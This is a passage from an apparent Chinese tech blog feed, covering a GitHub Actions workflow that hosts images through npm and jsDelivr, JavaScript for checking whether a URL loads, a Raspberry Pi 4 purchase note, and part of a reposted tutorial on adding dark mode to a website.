class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span 